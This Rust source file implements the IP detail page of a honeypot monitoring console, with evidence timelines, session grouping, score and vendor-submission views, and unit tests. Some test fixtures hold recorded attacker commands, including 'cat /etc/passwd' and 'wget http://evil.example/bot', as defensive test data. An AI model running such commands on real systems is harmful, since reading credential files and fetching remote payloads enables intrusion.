//! `GET /ip/:ip` - the IP detail page (`internal/design/06-console-observability.md`, "Pages" >
//! "IP detail"). Session-gated: mounted under the `protected` group in `routes::mod`.
//!
//! Five read-only queries, all scoped to the one path-param IP:
//! - the score summary via `core_scoring::read_score` (decayed to now, same as `routes::queue`)
//!   plus `core_scoring::effective_score` for the breadth-adjusted number the blocklist
//!   recommendation gate actually uses;
//! - the evidence timeline: the last 200 `event` rows for this IP, newest first, grouped in Rust
//!   into per-connection session cards (`session_id`) with an "Ungrouped events" tail for rows
//!   that predate session tracking (`internal/design/11-console-forensics.md`, "Detail page:
//!   payload visibility and session grouping");
//! - the per-WAN breakdown: `event` rows GROUP BY `wan_ip` - internal-only attribution the
//!   operator sees here but that never reaches the feed or a vendor report (this design's own
//!   "Per-WAN attribution is internal-only");
//! - the category breakdown, derived from the already-fetched `IpScore.category_breakdown` (no
//!   extra query - it is the same JSON `routes::queue`'s `live_categories` reads, just kept as
//!   weight/confidence values here instead of collapsed to a category list);
//! - the submission history: `vendor_submission` rows for this IP.
//!
//! An IP with no `ip_score` row renders 404, matching the design's "Error handling": "Missing IP
//! ... returns 404." That is a normal, expected outcome (an operator following a stale link, or
//! guessing an IP), not a database/template failure, so it is handled directly rather than
//! through `AppError` (whose every variant renders a generic 503 - see that module's doc
//! comment): a 404 here says something true and specific, a 503 would not.
//!
//! Chart (sub-project 6, console-charts, task 4): a per-IP 7-day event timeline, one more
//! Chart.js chart fed by `Chart` (the global `routes::dashboard`'s templates already load). Its
//! query is supplementary rather than core content - same soft-fail policy `routes::dashboard`'s
//! own doc comment establishes for its charts ("a slow or errored chart query degrades to an
//! empty chart... never a 503"), unlike this module's other four queries, which all hard-fail via
//! `?`: an IP whose score/evidence/WAN/submission data cannot be read is a broken page, but one
//! whose 7-day sparkline query hiccups is still a perfectly usable detail page minus one chart.
//! `generate_series` zero-fills all 7 buckets unconditionally, so - like the dashboard's own main
//! timeline - the chart always renders, never gated behind an empty-state check.

use std::collections::BTreeMap;
use std::net::IpAddr;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::{Html, IntoResponse, Response};
use axum::routing::get;
use axum::{Extension, Router};
use chrono::{DateTime, NaiveDate, Utc};
use core_scoring::{Category, Protocol, SignalType, effective_score, read_score};
use minijinja::context;
use rust_decimal::Decimal;
use rust_decimal::prelude::ToPrimitive;
use serde::{Deserialize, Serialize};
use sqlx::Row;

use crate::AppState;
use crate::auth::Session;
use crate::routes::context::{BaseContext, base_context};
use crate::routes::error::AppError;
use crate::routes::format::{
    format_activity, format_relative_time, format_sensor_label, format_timestamp, tier_label,
};

pub fn router() -> Router<AppState> {
    Router::new().route("/ip/{ip}", get(detail))
}

/// One `event` row as rendered in a session card's body (or the "Ungrouped events" table for
/// pre-`session_id` rows). `activity` and `detail` are both pre-formatted display strings; the
/// fields below `session_id` never reach the template (`#[serde(skip)]`) - they exist purely so
/// [`group_into_sessions`] can derive session-level summaries (start time, duration, credential
/// used, command count) without re-parsing `metadata_json` or re-deriving the snake_case signal
/// type from `activity`'s human label.
#[derive(Debug, Serialize)]
struct EventRow {
    id: i64,
    observed_at: String,
    relative_time: String,
    activity: String,
    detail: String,
    protocol: String,
    authenticated: bool,
    wan_ip: String,
    metadata_json: String,
    session_id: Option<String>,
    #[serde(skip)]
    raw_observed_at: DateTime<Utc>,
    #[serde(skip)]
    sensor_raw: String,
    #[serde(skip)]
    signal_type_raw: String,
    #[serde(skip)]
    metadata: serde_json::Value,
}

/// One collapsible session card: every `EventRow` sharing a non-null `session_id`, in
/// chronological (oldest-first) order, plus the summary [`group_into_sessions`] derives from
/// them for the card header.
#[derive(Debug, Serialize)]
struct SessionGroup {
    session_id: String,
    start_time: String,
    start_relative: String,
    duration: String,
    sensor: String,
    protocol: String,
    username: String,
    command_count: usize,
    event_count: usize,
    events: Vec<EventRow>,
    expanded: bool,
    /// The latest `observed_at` in the group, formatted like `start_time`. Not rendered by the
    /// template (there's no "session end" field in the card header - `duration` already conveys
    /// the span) - it exists purely as [`group_into_sessions`]'s sort key, per the design spec's
    /// "Order sessions by most recent first (latest `observed_at` in each group)": sorting on
    /// `start_time` instead would put a still-ongoing long session behind a short session that
    /// started later but both started and ended after it.
    #[serde(skip)]
    end_time: String,
}

#[derive(Debug, Serialize)]
struct WanRow {
    wan_ip: String,
    event_count: i64,
    has_authenticated: bool,
}

#[derive(Debug, Serialize)]
struct CategoryRow {
    category: String,
    weight: String,
    max_confidence: String,
}

#[derive(Debug, Serialize)]
struct SubmissionRow {
    submitted_at: String,
    vendor: String,
    categories: String,
    response_status: String,
    success: bool,
}

/// Mirrors the JSON shape of `core_scoring::scoring::engine::CategoryStat` (crate-private there -
/// see `queue.rs`'s `live_categories` for the same deserialize-a-local-shape approach applied to
/// just the category keys).
#[derive(Debug, Deserialize)]
struct CategoryStatView {
    weight: Decimal,
    max_confidence: Decimal,
}

async fn detail(
    State(state): State<AppState>,
    Extension(session): Extension<Session>,
    Path(ip): Path<IpAddr>,
) -> Result<Response, AppError> {
    let Some(score) = read_score(&state.db, ip).await? else {
        return Ok((StatusCode::NOT_FOUND, not_found_body(ip)).into_response());
    };

    let effective = effective_score(score.raw_score, score.distinct_wan_count as u32);
    let raw_f64 = score.raw_score.to_f64().unwrap_or(0.0);
    let effective_f64 = effective.to_f64().unwrap_or(0.0);

    let evidence_rows = sqlx::query(
        "SELECT id, host(wan_ip) AS wan_ip, sensor, signal_type, protocol, authenticated, \
                observed_at, metadata, session_id::text AS session_id \
         FROM event WHERE source_ip = $1::inet ORDER BY observed_at DESC LIMIT 200",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut all_events = Vec::with_capacity(evidence_rows.len());
    for row in evidence_rows {
        let sensor: String = row.try_get("sensor")?;
        let signal_type: SignalType = row.try_get("signal_type")?;
        let protocol: Protocol = row.try_get("protocol")?;
        let observed_at: DateTime<Utc> = row.try_get("observed_at")?;
        let metadata: serde_json::Value = row.try_get("metadata")?;
        let signal_snake = signal_type_snake(signal_type);
        let metadata_json =
            serde_json::to_string_pretty(&metadata).unwrap_or_else(|_| "{}".to_string());
        all_events.push(EventRow {
            id: row.try_get("id")?,
            observed_at: format_timestamp(observed_at),
            relative_time: format_relative_time(observed_at),
            activity: format_activity(&sensor, &signal_snake),
            detail: extract_detail(&signal_snake, &metadata),
            protocol: format!("{protocol:?}"),
            authenticated: row.try_get("authenticated")?,
            wan_ip: row
                .try_get::<Option<String>, _>("wan_ip")?
                .unwrap_or_else(|| "-".to_string()),
            metadata_json,
            session_id: row.try_get("session_id")?,
            raw_observed_at: observed_at,
            sensor_raw: sensor,
            signal_type_raw: signal_snake,
            metadata,
        });
    }
    let total_event_count = all_events.len();
    let (sessions, ungrouped) = group_into_sessions(all_events, 3);

    let wan_rows = sqlx::query(
        "SELECT host(wan_ip) AS wan_ip, COUNT(*) AS event_count, \
                bool_or(protocol = 'tcp' AND authenticated) AS has_authenticated \
         FROM event WHERE source_ip = $1::inet AND wan_ip IS NOT NULL \
         GROUP BY wan_ip ORDER BY event_count DESC",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut per_wan = Vec::with_capacity(wan_rows.len());
    for row in wan_rows {
        per_wan.push(WanRow {
            wan_ip: row.try_get("wan_ip")?,
            event_count: row.try_get("event_count")?,
            has_authenticated: row
                .try_get::<Option<bool>, _>("has_authenticated")?
                .unwrap_or(false),
        });
    }

    let categories = category_rows(&score.category_breakdown);

    let submission_rows = sqlx::query(
        "SELECT vendor, categories, submitted_at, response_status, success \
         FROM vendor_submission WHERE source_ip = $1::inet ORDER BY submitted_at DESC",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut submissions = Vec::with_capacity(submission_rows.len());
    for row in submission_rows {
        let submitted_at: DateTime<Utc> = row.try_get("submitted_at")?;
        let categories: Vec<String> = row.try_get("categories")?;
        let response_status: Option<i32> = row.try_get("response_status")?;
        submissions.push(SubmissionRow {
            submitted_at: format_timestamp(submitted_at),
            vendor: row.try_get("vendor")?,
            categories: categories.join(", "),
            response_status: response_status
                .map(|s| s.to_string())
                .unwrap_or_else(|| "-".to_string()),
            success: row.try_get("success")?,
        });
    }

    // 7 daily buckets, oldest to newest, zero-filled where a day had no events for this IP -
    // always exactly 7 rows (the `generate_series` bound is unconditional), matching the
    // dashboard's own always-populated hourly timeline. Supplementary: soft-fails to an empty
    // chart rather than the whole page, per the module doc comment.
    let ip_timeline_rows = sqlx::query(
        "SELECT bucket::date, COALESCE(cnt, 0) AS cnt \
         FROM generate_series(current_date - interval '6 days', current_date, interval '1 day') AS bucket \
         LEFT JOIN ( \
             SELECT date_trunc('day', observed_at)::date AS day, COUNT(*) AS cnt \
             FROM event \
             WHERE source_ip = $1::inet AND observed_at >= current_date - interval '6 days' \
             GROUP BY day \
         ) sub ON sub.day = bucket::date \
         ORDER BY bucket",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await
    .unwrap_or_default();
    let mut ip_timeline_labels: Vec<String> = Vec::with_capacity(ip_timeline_rows.len());
    let mut ip_timeline_data: Vec<i64> = Vec::with_capacity(ip_timeline_rows.len());
    for row in ip_timeline_rows {
        let bucket: NaiveDate = row.try_get("bucket")?;
        ip_timeline_labels.push(bucket.format("%b %-d").to_string());
        ip_timeline_data.push(row.try_get("cnt")?);
    }

    let csrf_token = state
        .sessions
        .generate_csrf(&session.id)
        .unwrap_or_default();
    let BaseContext {
        pending_count,
        uptime,
        version,
    } = base_context(&state.db, state.startup_time, state.version).await;

    // Shadowed into their JSON-string form right before the template needs them - see
    // `routes::dashboard`'s doc comment for why a string (rendered with `|safe`) rather than a
    // native minijinja list: minijinja auto-escapes every `.html` template, so an un-`|safe`'d
    // JSON string's own quotes would be HTML-entity-escaped into a JS syntax error.
    let ip_timeline_labels =
        serde_json::to_string(&ip_timeline_labels).unwrap_or_else(|_| "[]".into());
    let ip_timeline_data = serde_json::to_string(&ip_timeline_data).unwrap_or_else(|_| "[]".into());

    let tmpl = state.templates.get_template("detail.html")?;
    let html = tmpl.render(context! {
        csrf_token,
        active_nav => "detail",
        pending_count,
        uptime,
        version,
        ip => ip.to_string(),
        raw_score => format!("{:.1}", score.raw_score),
        raw_score_pct => raw_f64.clamp(0.0, 100.0).round() as u32,
        effective_score => format!("{:.1}", effective),
        effective_score_pct => effective_f64.clamp(0.0, 100.0).round() as u32,
        tier => score.tier.map(tier_label).unwrap_or("-"),
        eligible => score.eligible,
        recommended_for_vendor => score.recommended_for_vendor,
        recommended_for_blocklist => score.recommended_for_blocklist,
        has_confirmed_real => score.has_confirmed_real,
        event_count => score.event_count,
        distinct_categories => score.distinct_categories,
        distinct_wan_count => score.distinct_wan_count,
        distinct_sensor_count => score.distinct_sensor_count,
        max_confidence => format!("{:.3}", score.max_confidence),
        first_seen => format_timestamp(score.first_seen),
        last_seen => format_timestamp(score.last_seen),
        sessions,
        ungrouped,
        total_event_count,
        per_wan,
        categories,
        submissions,
        ip_timeline_labels,
        ip_timeline_data,
    })?;
    Ok(Html(html).into_response())
}

/// Every category ever contributed for this IP, with its CURRENT (live-decayed) weight - not
/// filtered to only those still above the eligibility engine's 0.5 live floor. A category that
/// has since decayed away is still real evidence history; hiding it here would make the detail
/// page (the one place meant to show the full picture) less complete than the queue's own
/// category summary.
fn category_rows(breakdown: &serde_json::Value) -> Vec<CategoryRow> {
    let Ok(map) = serde_json::from_value::<BTreeMap<Category, CategoryStatView>>(breakdown.clone())
    else {
        return Vec::new();
    };
    map.into_iter()
        .map(|(category, stat)| CategoryRow {
            category: format!("{category:?}").to_lowercase(),
            weight: format!("{:.1}", stat.weight),
            max_confidence: format!("{:.3}", stat.max_confidence),
        })
        .collect()
}

/// `core_scoring::SignalType`'s `Debug` output is `PascalCase` (e.g. `HoneypotCommandExec`); the
/// DB's `signal_type_enum` and this module's own `extract_detail`/`format_activity` match arms
/// both key on the wire's `snake_case` spelling (`honeypot_command_exec`), so every caller that
/// needs the string form converts through here rather than re-deriving the fold independently.
fn signal_type_snake(signal_type: SignalType) -> String {
    let pascal = format!("{signal_type:?}");
    pascal.chars().fold(String::new(), |mut s, c| {
        if c.is_uppercase() && !s.is_empty() {
            s.push('_');
        }
        s.push(c.to_ascii_lowercase());
        s
    })
}

/// Signal-type-dependent extraction of the single most useful `metadata` field for the evidence
/// timeline's "Detail" column - `internal/design/11-console-forensics.md`'s "Detail column
/// extraction by signal type" table. `pub(crate)` because `routes::search` (console-forensics
/// task 5) reuses it verbatim for the same column in event search results.
pub(crate) fn extract_detail(signal_type: &str, metadata: &serde_json::Value) -> String {
    match signal_type {
        "honeypot_command_exec" => metadata
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "honeypot_login_attempt" => metadata
            .get("username")
            .and_then(|v| v.as_str())
            .map(|u| format!("user: {u}"))
            .unwrap_or_else(|| "-".into()),
        "honeypot_malware_upload" => {
            let name = metadata
                .get("sample_orig_name")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");
            let sha = metadata
                .get("sample_sha256")
                .and_then(|v| v.as_str())
                .map(|s| &s[..s.len().min(12)])
                .unwrap_or("?");
            let size = metadata
                .get("sample_size")
                .and_then(|v| v.as_u64())
                .map(format_bytes)
                .unwrap_or_default();
            format!("{name} ({sha}..., {size})")
        }
        "honeypot_file_download" => metadata
            .get("url")
            .or_else(|| metadata.get("command"))
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "honeypot_connection" => metadata
            .get("protocol_label")
            .and_then(|v| v.as_str())
            .unwrap_or("-")
            .to_string(),
        "catchall_probe" => metadata
            .get("port")
            .and_then(|v| v.as_u64())
            .map(|p| format!("port {p}"))
            .unwrap_or_else(|| "-".into()),
        _ => metadata
            .as_object()
            .and_then(|m| {
                m.iter()
                    .find(|(k, _)| k.as_str() != "protocol_label")
                    .map(|(k, v)| format!("{k}: {v}"))
            })
            .unwrap_or_else(|| "-".into()),
    }
}

/// Human-readable byte count for the malware-upload detail column (`4.2 KB`, `1.1 MB`).
fn format_bytes(b: u64) -> String {
    if b < 1024 {
        format!("{b} B")
    } else if b < 1024 * 1024 {
        format!("{:.1} KB", b as f64 / 1024.0)
    } else {
        format!("{:.1} MB", b as f64 / (1024.0 * 1024.0))
    }
}

/// Human-readable elapsed time for a session card's duration (`12s`, `3m05s`, `1h02m`).
fn format_duration(d: chrono::Duration) -> String {
    let total_secs = d.num_seconds().max(0);
    if total_secs < 60 {
        format!("{total_secs}s")
    } else if total_secs < 3600 {
        format!("{}m{:02}s", total_secs / 60, total_secs % 60)
    } else {
        format!("{}h{:02}m", total_secs / 3600, (total_secs % 3600) / 60)
    }
}

/// Splits the flat, newest-first `all_events` into per-`session_id` [`SessionGroup`]s (each
/// sorted oldest-first, so a card reads top-to-bottom as the connection unfolded) plus an
/// "Ungrouped events" tail for rows with no `session_id` (pre-existing data from before this
/// column existed - `internal/design/11-console-forensics.md`'s "degrade gracefully"). Groups are
/// then ordered most-recent-session-first, and the `recent_expanded` newest get `expanded: true`
/// so the operator lands on an already-open view of current activity rather than a wall of
/// collapsed cards.
fn group_into_sessions(
    rows: Vec<EventRow>,
    recent_expanded: usize,
) -> (Vec<SessionGroup>, Vec<EventRow>) {
    let mut sessions: BTreeMap<String, Vec<EventRow>> = BTreeMap::new();
    let mut ungrouped = Vec::new();

    for row in rows {
        match row.session_id.clone() {
            Some(sid) => sessions.entry(sid).or_default().push(row),
            None => ungrouped.push(row),
        }
    }

    let mut groups: Vec<SessionGroup> = sessions
        .into_iter()
        .map(|(session_id, mut events)| {
            events.sort_by_key(|e| e.raw_observed_at);

            // `events` is never empty here - every group came from `.entry(sid).or_default()`
            // being pushed into at least once, so these two endpoints always exist.
            let start = events[0].raw_observed_at;
            let end = events[events.len() - 1].raw_observed_at;

            let username = events
                .iter()
                .find(|e| e.signal_type_raw == "honeypot_login_attempt")
                .and_then(|e| e.metadata.get("username"))
                .and_then(|v| v.as_str())
                .unwrap_or_default()
                .to_string();
            let command_count = events
                .iter()
                .filter(|e| e.signal_type_raw == "honeypot_command_exec")
                .count();

            SessionGroup {
                session_id,
                start_time: events[0].observed_at.clone(),
                start_relative: events[0].relative_time.clone(),
                duration: format_duration(end - start),
                sensor: format_sensor_label(&events[0].sensor_raw),
                protocol: events[0].protocol.clone(),
                username,
                command_count,
                event_count: events.len(),
                end_time: format_timestamp(end),
                events,
                expanded: false,
            }
        })
        .collect();

    // Most-recent-first by session END (latest `observed_at` in the group) -
    // `internal/design/11-console-forensics.md`'s "Order sessions by most recent first (latest
    // `observed_at` in each group)", not by when each session started.
    groups.sort_by(|a, b| b.end_time.cmp(&a.end_time));
    for (i, g) in groups.iter_mut().enumerate() {
        g.expanded = i < recent_expanded;
    }
    (groups, ungrouped)
}

/// `IpAddr::to_string()`/`Display` can only ever produce digits, `.`, and `:` - never an HTML
/// metacharacter - so interpolating it directly into a literal string here is safe by
/// construction, the same reasoning `routes::error`'s static `GENERIC_BODY` relies on for having
/// no interpolation at all.
fn not_found_body(ip: IpAddr) -> Html<String> {
    Html(format!(
        "<!doctype html><meta charset=\"utf-8\"><title>IP not found</title>\
         <p style=\"font-family:sans-serif;padding:2rem\">No score projection found for {ip}. \
         It may not have been scored yet, or the IP was mistyped.</p>"
    ))
}

#[cfg(test)]
mod tests {
    use chrono::Duration;
    use serde_json::json;

    use super::*;

    /// Builds a minimal `EventRow` fixture. Every caller overrides only the fields its test
    /// actually exercises, so a change to an unrelated field never touches every test in the
    /// module - the same shape as `sensor-catchall`'s own `build_event` test fixtures.
    fn event_row(
        session_id: Option<&str>,
        signal_type: &str,
        seconds_ago: i64,
        metadata: serde_json::Value,
    ) -> EventRow {
        let observed_at = Utc::now() - Duration::seconds(seconds_ago);
        EventRow {
            id: 1,
            observed_at: format_timestamp(observed_at),
            relative_time: format_relative_time(observed_at),
            activity: format_activity("ssh", signal_type),
            detail: extract_detail(signal_type, &metadata),
            protocol: "Tcp".into(),
            authenticated: true,
            wan_ip: "203.0.113.9".into(),
            metadata_json: metadata.to_string(),
            session_id: session_id.map(str::to_string),
            raw_observed_at: observed_at,
            sensor_raw: "ssh".into(),
            signal_type_raw: signal_type.into(),
            metadata,
        }
    }

    #[test]
    fn extract_detail_command_exec_reads_command_field() {
        let metadata = json!({ "command": "cat /etc/passwd" });
        assert_eq!(
            extract_detail("honeypot_command_exec", &metadata),
            "cat /etc/passwd"
        );
    }

    #[test]
    fn extract_detail_login_attempt_prefixes_username() {
        let metadata = json!({ "username": "root" });
        assert_eq!(
            extract_detail("honeypot_login_attempt", &metadata),
            "user: root"
        );
    }

    #[test]
    fn extract_detail_malware_upload_truncates_sha_and_formats_size() {
        let metadata = json!({
            "sample_orig_name": "payload.sh",
            "sample_sha256": "a1b2c3d4e5f6a7b8c9d0",
            "sample_size": 4300u64,
        });
        assert_eq!(
            extract_detail("honeypot_malware_upload", &metadata),
            "payload.sh (a1b2c3d4e5f6..., 4.2 KB)"
        );
    }

    #[test]
    fn extract_detail_malware_upload_missing_fields_falls_back() {
        let metadata = json!({});
        assert_eq!(
            extract_detail("honeypot_malware_upload", &metadata),
            "unknown (?..., )"
        );
    }

    #[test]
    fn extract_detail_file_download_prefers_url_over_command() {
        let metadata = json!({ "url": "http://evil.example/bot", "command": "wget" });
        assert_eq!(
            extract_detail("honeypot_file_download", &metadata),
            "http://evil.example/bot"
        );
    }

    #[test]
    fn extract_detail_file_download_falls_back_to_command() {
        let metadata = json!({ "command": "wget http://evil.example/bot" });
        assert_eq!(
            extract_detail("honeypot_file_download", &metadata),
            "wget http://evil.example/bot"
        );
    }

    #[test]
    fn extract_detail_connection_reads_protocol_label() {
        let metadata = json!({ "protocol_label": "ssh" });
        assert_eq!(extract_detail("honeypot_connection", &metadata), "ssh");
    }

    #[test]
    fn extract_detail_catchall_probe_reads_port() {
        let metadata = json!({ "port": 8080 });
        assert_eq!(extract_detail("catchall_probe", &metadata), "port 8080");
    }

    #[test]
    fn extract_detail_catchall_probe_missing_port_falls_back_to_dash() {
        let metadata = json!({ "payload_hex": "deadbeef", "observed_len": 4 });
        assert_eq!(extract_detail("catchall_probe", &metadata), "-");
    }

    #[test]
    fn extract_detail_unknown_signal_skips_protocol_label() {
        let metadata = json!({ "protocol_label": "redis", "note": "unusual" });
        assert_eq!(
            extract_detail("some_future_signal", &metadata),
            "note: \"unusual\""
        );
    }

    #[test]
    fn extract_detail_unknown_signal_with_only_protocol_label_falls_back_to_dash() {
        let metadata = json!({ "protocol_label": "redis" });
        assert_eq!(extract_detail("some_future_signal", &metadata), "-");
    }

    #[test]
    fn signal_type_snake_converts_pascal_case() {
        assert_eq!(
            signal_type_snake(SignalType::HoneypotCommandExec),
            "honeypot_command_exec"
        );
        assert_eq!(
            signal_type_snake(SignalType::CatchallProbe),
            "catchall_probe"
        );
    }

    #[test]
    fn format_bytes_picks_the_right_unit() {
        assert_eq!(format_bytes(512), "512 B");
        assert_eq!(format_bytes(4300), "4.2 KB");
        assert_eq!(format_bytes(5_242_880), "5.0 MB");
    }

    #[test]
    fn format_duration_picks_the_right_unit() {
        assert_eq!(format_duration(Duration::seconds(42)), "42s");
        assert_eq!(format_duration(Duration::seconds(185)), "3m05s");
        assert_eq!(format_duration(Duration::seconds(3725)), "1h02m");
    }

    #[test]
    fn group_into_sessions_separates_grouped_from_ungrouped() {
        let rows = vec![
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                None,
                "honeypot_login_attempt",
                90,
                json!({ "username": "admin" }),
            ),
        ];
        let (groups, ungrouped) = group_into_sessions(rows, 3);
        assert_eq!(groups.len(), 1);
        assert_eq!(ungrouped.len(), 1);
        assert_eq!(groups[0].session_id, "sess-a");
    }

    #[test]
    fn group_into_sessions_derives_username_and_command_count() {
        let rows = vec![
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-a"),
                "honeypot_login_attempt",
                90,
                json!({ "username": "root" }),
            ),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                80,
                json!({ "command": "whoami" }),
            ),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                70,
                json!({ "command": "id" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        assert_eq!(groups.len(), 1);
        assert_eq!(groups[0].username, "root");
        assert_eq!(groups[0].command_count, 2);
        assert_eq!(groups[0].event_count, 4);
    }

    #[test]
    fn group_into_sessions_orders_events_within_a_session_oldest_first() {
        let rows = vec![
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                10,
                json!({ "command": "b" }),
            ),
            event_row(Some("sess-a"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-a"),
                "honeypot_command_exec",
                50,
                json!({ "command": "a" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        let activities: Vec<&str> = groups[0].events.iter().map(|e| e.detail.as_str()).collect();
        assert_eq!(activities, vec!["-", "a", "b"]);
    }

    #[test]
    fn group_into_sessions_orders_sessions_most_recent_first_and_expands_only_the_newest() {
        let rows = vec![
            event_row(Some("sess-old"), "honeypot_connection", 1000, json!({})),
            event_row(Some("sess-mid"), "honeypot_connection", 500, json!({})),
            event_row(Some("sess-new"), "honeypot_connection", 10, json!({})),
        ];
        let (groups, _) = group_into_sessions(rows, 2);
        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
        assert_eq!(ids, vec!["sess-new", "sess-mid", "sess-old"]);
        assert!(groups[0].expanded);
        assert!(groups[1].expanded);
        assert!(!groups[2].expanded);
    }

    #[test]
    fn group_into_sessions_orders_by_end_time_not_start_time() {
        // "sess-long" starts long before "sess-short" but is still running: its last event is
        // more recent than "sess-short"'s. Sorting by `start_time` (the bug) would put
        // "sess-short" first, since it started more recently even though it ended earlier -
        // sorting by `end_time` (the design spec's "latest observed_at in each group") puts
        // "sess-long" first instead.
        let rows = vec![
            event_row(Some("sess-long"), "honeypot_connection", 500, json!({})),
            event_row(
                Some("sess-long"),
                "honeypot_command_exec",
                50,
                json!({ "command": "id" }),
            ),
            event_row(Some("sess-short"), "honeypot_connection", 100, json!({})),
            event_row(
                Some("sess-short"),
                "honeypot_command_exec",
                90,
                json!({ "command": "id" }),
            ),
        ];
        let (groups, _) = group_into_sessions(rows, 3);
        let ids: Vec<&str> = groups.iter().map(|g| g.session_id.as_str()).collect();
        assert_eq!(ids, vec!["sess-long", "sess-short"]);
    }

    #[test]
    fn group_into_sessions_with_no_sessions_returns_empty_groups() {
        let rows = vec![event_row(None, "catchall_probe", 5, json!({ "port": 22 }))];
        let (groups, ungrouped) = group_into_sessions(rows, 3);
        assert!(groups.is_empty());
        assert_eq!(ungrouped.len(), 1);
    }
}
